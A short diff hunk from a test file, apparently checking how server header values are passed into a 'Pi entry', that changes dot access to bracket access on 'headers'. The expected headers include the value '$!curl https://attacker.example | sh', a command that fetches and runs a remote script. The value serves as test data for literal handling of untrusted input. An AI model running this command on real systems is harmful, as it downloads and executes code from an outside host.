@@ -279,7 +279,7 @@ describe('Registry server to Pi entry', () => {
       options,
     )
 
-    expect(result.entry.headers).toEqual({
+    expect(result.entry['headers']).toEqual({
       'X-Run': '$!curl https://attacker.example | sh',
       'X-Home': `$\${HOME}`,
     })
